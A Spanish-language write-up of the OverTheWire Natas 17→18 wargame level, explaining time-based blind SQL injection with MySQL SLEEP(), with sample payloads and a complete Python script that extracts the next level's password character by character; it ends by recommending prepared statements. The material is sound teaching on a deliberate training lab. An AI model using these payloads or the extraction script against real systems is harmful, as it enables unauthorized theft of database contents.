# Natas Level 17 → Level 18

> ⚠️ Spoilers: las contraseñas están omitidas (`[redacted]`). Lo importante es el método.

- **URL:** `http://natas17.natas.labs.overthewire.org`
- **Credenciales:** `natas17` / `[redacted]`

## Análisis y Explotación
Casi idéntico a natas15: un buscador de username con la misma query vulnerable.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
}
```

**La diferencia clave:** los `echo` de "existe / no existe" están **comentados**. La respuesta HTTP se ve idéntica mandes lo que mandes — el canal booleano de natas15 desapareció. Mirar el contenido ya no sirve.

### El vector: Time-based Blind SQLi

Si la página no responde nada visible pero igual ejecuta tu SQL, el canal lateral que queda es el **tiempo de respuesta**. Se usa la función `SLEEP()` de MySQL: *"si mi condición es verdadera, dormí X segundos; si no, respondé al instante"*. Se mide cuánto tarda la respuesta:
- Tardó ~X seg más de lo normal → condición verdadera
- Respondió rápido → falsa

**Confirmación del vector** (payload en el campo `username`):
```sql
" OR SLEEP(5) -- -
```
> Ojo con el comentario: `-- ` necesita un espacio (o un carácter) después para que MySQL lo tome como comentario. `-- -` lo garantiza. Alternativa: `#` (URL-encodeado `%23`).

En Burp Repeater, el tiempo de respuesta sale abajo a la derecha ("X millis"). La línea base era ~1200 ms; con el `SLEEP()` saltó a varios segundos, confirmando la inyección.

### El payload por carácter

Se usa `IF(condición, SLEEP(3), 0)` para que duerma **una sola vez** (no una por fila, que dispararía el tiempo innecesariamente):

```sql
" OR IF((SELECT 1 FROM users WHERE username="natas18" AND password LIKE BINARY "a%"),SLEEP(3),0) -- -
```

- Si la password de natas18 empieza con `a` → `IF` evalúa `SLEEP(3)` → respuesta lenta
- Si no → responde al instante (~1.2 seg)

`LIKE BINARY` fuerza comparación case-sensitive, igual que en natas15.

### Automatización con Python

Mismo esquema que natas16, pero el "sí/no" se mide por **tiempo** en vez de por contenido. Clave: envolver cada request en reintentos (la red puede cortar) y confirmar cada acierto con un segundo request para no cortar antes de los 32 caracteres:

```python
import requests, string, time

URL  = "http://natas17.natas.labs.overthewire.org/"
USER = "natas17"
PASS = "[redacted]"

charset   = string.ascii_letters + string.digits
SLEEP     = 5
THRESHOLD = 3
TIMEOUT   = 20
password  = ""

def req(payload):
    while True:
        try:
            start = time.time()
            requests.post(URL, auth=(USER, PASS),
                          data={"username": payload}, timeout=TIMEOUT + SLEEP)
            return time.time() - start
        except requests.exceptions.RequestException:
            time.sleep(3)   # red falló → reintenta

def is_true(guess):
    payload = (f'" OR IF((SELECT 1 FROM users WHERE username="natas18" '
               f'AND password LIKE BINARY "{guess}%"),SLEEP({SLEEP}),0) -- -')
    for _ in range(2):              # doble confirmación
        if req(payload) <= THRESHOLD:
            return False
    return True

while len(password) < 32:
    for c in charset:
        if is_true(password + c):
            password += c
            print(f"[+] ({len(password):2}/32) {password}")
            break
    else:
        break

print(f"[*] Password natas18: {password}")
```

- **Password obtenida (`natas18`):** `[redacted]`

## Lección aprendida
Ocultar la salida de la query **no** mitiga una SQLi. Mientras el input siga concatenándose en la consulta, un canal lateral — aquí el tiempo de respuesta vía `SLEEP()` — basta para extraer todo carácter por carácter. La defensa es la misma de siempre: **prepared statements**. Comentar los `echo` solo sube el costo del ataque (más lento), no lo impide.
